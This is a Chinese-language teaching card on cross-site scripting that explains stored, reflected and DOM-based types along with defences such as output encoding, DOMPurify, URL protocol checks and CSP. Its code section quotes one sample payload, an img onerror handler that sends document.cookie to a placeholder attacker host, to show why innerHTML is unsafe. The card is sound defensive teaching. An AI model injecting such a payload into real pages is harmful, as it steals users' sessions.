跨站脚本攻击

XSS

📐 01 · 定义

跨站脚本攻击（Cross-Site Scripting，XSS）是攻击者把恶意脚本注入到受信任网站的页面中，使其在其他用户浏览器里以该网站身份执行的漏洞。它属于 Web 前端注入类风险，可窃取会话、伪造操作、篡改页面。按触发方式分为存储型、反射型和 DOM 型。根本防御是按输出上下文编码。

⚙️ 02 · 原理
  1. 1

    攻击者找到会把输入渲染到页面的位置，如评论、搜索词回显、URL 参数。

  2. 2

    提交包含脚本的输入，如带 onerror 事件的 img 标签或 javascript: 链接。

  3. 3

    应用未按上下文编码就把输入插入 HTML、属性、URL 或 JavaScript 中。

  4. 4

    受害者打开页面，浏览器把注入内容解析为代码并以该站点源（Origin）的权限执行。

  5. 5

    脚本可读取页面数据、调用同源接口、读取非 HttpOnly Cookie 或把数据发往攻击者服务器。

🔤 03 · 术语
存储型 XSS (Stored)
恶意内容被保存到服务端，所有访问者都会触发。
反射型 XSS (Reflected)
恶意内容在请求参数中，服务器直接回显到响应。
DOM 型 XSS
前端 JS 把不可信数据写入危险 DOM 接口导致执行。
输出编码 (Output Encoding)
按 HTML、属性、URL 等上下文转义特殊字符。
CSP (内容安全策略)
通过响应头限制脚本来源，作为纵深防御。
💻 04 · 代码
危险写法与安全写法javascript
const comment = '<img src=x onerror="fetch(`https://evil.example/?c=${document.cookie}`)">';

// 危险：把不可信内容当 HTML 解析
el.innerHTML = comment;

// 安全：作为纯文本插入，浏览器不会解析标签
el.textContent = comment;

// 确需渲染富文本：用 DOMPurify 清洗后再插入
import DOMPurify from "dompurify";
el.innerHTML = DOMPurify.sanitize(userHtml);

// URL 也是危险上下文：只允许 http/https 协议
const url = new URL(userLink, location.origin);
if (["http:", "https:"].includes(url.protocol)) a.href = url.href;

// React 默认转义 {comment}；dangerouslySetInnerHTML 等同 innerHTML
// <div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(html) }} />

textContent 与框架默认转义是首选；富文本必须先清洗；链接需校验协议。

📊 05 · 参数对比

输出上下文与处理

上下文示例位置正确处理
HTML 正文<div>这里</div>HTML 实体编码或 textContent
HTML 属性title="这里"属性编码并始终加引号
URLhref="这里"校验协议并 URL 编码
JavaScript<script>中的变量避免插入；必须时 JSON 序列化并转义
⚖️ 06 · 方案取舍

框架自动转义

优点默认安全，零成本

代价绕过 API 时失效

适用所有前端项目的基础

HTML 清洗库

优点允许安全的富文本

代价需保持库更新

适用评论、富文本编辑器

严格 CSP

优点漏洞存在时也能限制危害

代价改造内联脚本成本高

适用纵深防御、高安全要求

🕳️ 07 · 常见坑

  • ✗在输入时过滤 <script> 就以为安全

    ✓在输出时按上下文编码，事件属性等同样危险

  • ✗React 中随意用 dangerouslySetInnerHTML

    ✓必须先用 DOMPurify 清洗，或改为普通渲染

  • ✗把模型生成的 Markdown 直接渲染为 HTML

    ✓LLM 输出视为不可信，渲染时禁用原始 HTML 并清洗

  • ✗href 未校验，放行 javascript: 协议

    ✓只允许 http/https 等白名单协议

☑️ 08 · 检查清单
🎤 09 · 面试追问
为什么说 XSS 防御的核心是输出编码？

同一份数据在 HTML 正文、属性、URL、JavaScript 中的危险字符各不相同，输入时无法预知会输出到哪里。只有在输出时根据具体上下文做对应编码，才能保证数据始终被当作数据。输入校验只能作为补充。

HttpOnly 能防止 XSS 吗？

不能防止 XSS 本身，只能阻止脚本读取会话 Cookie。攻击脚本仍能在页面内以用户身份发起同源请求、读取页面内容、修改界面诱导用户输入。它是降低危害的措施，不是修复漏洞的方法。

CSP 怎样缓解 XSS？

CSP 通过响应头声明允许执行的脚本来源，严格策略会禁止内联脚本和 eval，并使用 nonce 或 hash 只放行可信脚本。即便存在注入点，注入的脚本也因不被允许而无法执行，是有效的纵深防御。
